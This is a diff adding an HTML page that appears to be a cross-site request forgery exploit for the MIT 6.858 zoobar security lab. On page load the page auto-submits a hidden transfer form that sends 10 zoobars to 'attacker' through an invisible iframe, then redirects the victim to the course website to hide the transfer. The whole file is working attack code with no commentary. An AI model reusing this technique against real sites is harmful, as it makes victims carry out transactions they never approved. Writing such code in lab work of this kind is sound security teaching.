@@ -1,0 +1,15 @@
+<form method="POST" id="n00b-forum" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="secret-iframe">
+<p>Send <input name="zoobars-fake" type="text" value="" size=5> <input name="zoobars" type="hidden" value="10"> zoobars</p>
+<p>to <input name="recipient-fake" type="text" value="" size=10> <input name="recipient" type="hidden" value="attacker"></p>
+<input type="submit" name="submission" value="Send">
+</form>
+
+<iframe id="secret-iframe" name="secret-iframe" style="width:0;height:0;border: 0;border: none;" src="idk"></iframe>
+
+<script>
+  document.forms.namedItem("n00b-forum").submit()
+
+  document.getElementById("secret-iframe").onload= function() {
+    window.location.href = "http://css.csail.mit.edu/6.858/2019/";        
+  };
+</script>
